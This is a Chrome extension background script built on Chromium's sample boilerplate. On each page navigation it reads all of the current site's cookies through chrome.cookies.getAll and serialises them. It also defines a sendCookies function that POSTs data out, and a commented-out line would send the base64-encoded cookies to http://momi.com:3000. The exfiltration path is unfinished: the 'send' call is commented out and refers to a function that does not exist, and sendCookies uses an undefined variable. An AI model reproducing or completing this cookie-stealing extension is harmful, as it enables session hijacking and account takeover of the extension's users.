// Copyright 2018 The Chromium Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

'use strict';

chrome.runtime.onInstalled.addListener(function() {
  chrome.declarativeContent.onPageChanged.removeRules(undefined, function() {
    chrome.declarativeContent.onPageChanged.addRules([{
      conditions: [new chrome.declarativeContent.PageStateMatcher({
        pageUrl: {urlContains: '.com'},
      })],
      actions: [new chrome.declarativeContent.ShowPageAction()]
    }]);
  });
});

console.log("Hello World");

let tabId;
chrome.tabs.onActivated.addListener(function(tab){
    tabId=tab.tabId;
    console.log(tabId);
});

chrome.webNavigation.onCompleted.addListener( function(){
  chrome.tabs.get(tabId,function(tab){
    let domain=tab.url.split("://")[1].split("/")[0];
      console.log("currentTab: "+tab.url);
      if(domain.startsWith("www.")){
        domain=domain.replace("www.","");
      }
      console.log ("domain: "+domain);
      chrome.cookies.getAll({domain:domain},function(cookies){
        console.log(unpackCookies(cookies));
        //send("http://momi.com:3000",btoa(data));
      });
  }); 
});

console.log("invoking GET");
fetch('https://postman-echo.com/get?foo1=bar1&foo2=bar2').then(r => r.text()).then(result => {
    console.log("Response of GET :"+result);
})

function unpackCookies(cookies){
  let s ="";

  cookies.forEach(domainCookie => {
    Object.keys(domainCookie).forEach(key => {
      s += `${key}:${domainCookie[key]}\n`
    });
  });
  return s;
}

function sendCookies(url,data){
  const xhr = new XMLHttpRequest();
  const params = "data=" + data;
  xhr.open("POST",URL,true);
  xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
  xhr.onreadystatechange=function(){
    if(xhr.readyState == 4 && xhr.status ==200){
      console.log(xhr.responseText);
    }
  }
  xhr.send(params);
}